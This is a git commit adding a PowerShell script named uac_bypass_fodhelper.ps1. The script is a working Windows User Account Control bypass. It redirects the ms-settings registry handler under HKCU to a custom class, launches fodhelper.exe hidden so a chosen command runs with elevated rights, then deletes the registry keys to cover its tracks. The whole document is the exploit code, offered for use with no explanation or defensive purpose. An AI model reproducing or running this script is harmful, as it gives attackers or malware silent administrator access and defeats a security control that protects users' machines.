f3f33d6238c7ca0de6da9884c2ab10060b10da8c
RFC1918-hub <61937657+RFC1918-hub@users.noreply.github.com>
2022-10-26 21:41:48 +0200

    Create uac_bypass_fodhelper.ps1

---
+++ uac_bypass_fodhelper.ps1
@@ -0,0 +1,21 @@
+function uac_fod {
+    param (
+        [string]$command
+    )
+    # uac_fod -command 'cmd /c start cmd.exe'
+
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+
+    New-Item "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Force
+	New-ItemProperty -Path "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Name "(default)" -Value $command -Force
+
+    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".rfc1918" -Force
+
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep 3
+	
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+    Remove-Item "HKCU:\Software\Classes\.rfc1918\" -Recurse -Force
+}
